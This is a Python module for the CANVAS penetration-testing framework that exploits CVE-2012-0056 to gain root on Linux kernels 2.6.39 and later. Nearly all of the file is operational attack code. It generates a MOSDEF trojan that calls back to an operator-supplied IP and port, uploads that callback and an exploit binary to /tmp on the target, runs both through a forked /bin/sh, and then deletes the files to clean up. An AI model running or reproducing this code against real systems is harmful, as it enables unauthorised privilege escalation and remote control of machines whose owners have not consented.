#!/usr/bin/env python

from __future__ import with_statement
import sys

from exploitutils import *
from canvasexploit import canvasexploit
from canvaserror import *
from libs.canvasos import *
from random import choice
from ExploitTypes.localexploit import LocalExploit


import canvasengine

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'CVE_2012_0056 linux local root'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges through CVE-2012-0056'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Linux'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2012-0056'
DOCUMENTATION['CVE Url']       = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0056'
DOCUMENTATION['Notes']         = 'Tested on Ubuntu 11.10 Desktop 32b, kernel 3.0.0-12-generic'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Linux']]

DOCUMENTATION['NOTES'] = """
Vulnerable kernels >=2.6.39 
<=?

http://blog.zx2c4.com/749
"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name                = NAME
        self.node                = None
        self.local_exploit       = 'exploits/CVE_2012_0056/Resources/exploit32' # local path exploit
        self.remote_exploit      = '/tmp/xx' # remote path to exploit
        self.local_cback         = None
        self.remote_cback        = '/tmp/t'  # remote path to callback
        self.tmppath             = os.path.join(os.path.dirname(__file__), 'Resources')

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def random_str(self, length):
        return ''.join([choice(string.letters) for i in xrange(length)])
    
    def nodeUpload(self, src, dst):
        try:
            self.node.upload(src, destfilename = dst)
        except NodeCommandError, i:
            self.log('[x] failed to upload %s to %s: %s' % (src, dst, str(i)))
            return False
        self.log('[+] upload succeeded ...')
        return True

    def fork_and_exec(self, command):
        vars = {'command' : command}

        code = """
        #import "string", "command" as "command"
        #import "local", "fork" as "fork"
        #import "local", "execve" as "execve"
        #import "local", "close" as "close"

        void main()
        {
            char *argv[4];
            char **envp;
            int pid;

            envp = 0;
            argv[0] = "/bin/sh";
            argv[1] = "-c";
            argv[2] = command;
            argv[3] = 0;

            pid = fork();

            if (pid == 0) {
                close(0);
                close(1);
                close(2);
                execve(argv[0], argv, envp);
            }
        }
        """
        self.node.shell.clearfunctioncache()
        req = self.node.shell.compile(code, vars)
        self.node.shell.sendrequest(req)
        self.node.shell.leave()

    def cleanup(self):
        self.node.shell.dounlink(self.remote_exploit)
        self.node.shell.dounlink(self.remote_cback)
        
    def run(self):
        self.node = self.argsDict['passednodes'][0]        

        if 'linux' not in self.node.capabilities:
            self.log('[!] Not a linux node ...')
            return 0

        #self.log('[+] Randomizing remote paths..') 
        #self.remote_exploit = self.remote_exploit + self.random_str(5)
        #self.remote_cback   = self.remote_cback + self.random_str(5)

        self.log('[+] Remote path to exploit: %s' % self.remote_exploit)
        self.log('[+] Remote path to callback: %s'  % self.remote_cback)
        
        self.log("Creating MOSDEF callback for ip: %s and port: %s" % (self.callback.ip, self.callback.port))
        
        platform = "Linux"
        t_os = canvasos(platform)
        t_os.arch = "X86"

        try:
            ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=t_os, universal=True)
            if ret:
                self.local_cback = os.path.join(self.tmppath, "callback_%s_%s" % (platform.lower(), t_os.arch))
                with open(self.local_cback, "wb") as f:
                    f.write(self.mosdeftrojan)
                self.log("[+] Done creating callback")
            else:
                raise Exception('buildmosdeftrojan returned False')
        except Exception, err:
            self.log("[!] Error building MOSDEF callback: %s" % err)
            return 0


        self.log('[+] uploading exploit ...')
                     
        if self.nodeUpload(self.local_exploit, self.remote_exploit) == False:
            self.log('[!] Could not upload exploit, aborting')
            return 0

        self.log('[+] uploading callback ...')
        if self.nodeUpload(self.local_cback, self.remote_cback) == False:
            self.log('[!] Could not upload callback, aborting')
            return 0
 
        self.log('[+] running exploit ...')
        self.fork_and_exec(self.remote_exploit)
        self.log("[+] Done running exploit")
        
        status = self.ISucceeded()

        if status:
            self.log("[*] Success!")
        else:
            self.log("[*] Exploit failed")

        self.log("[+] Removing files..")
        self.cleanup()

        return status
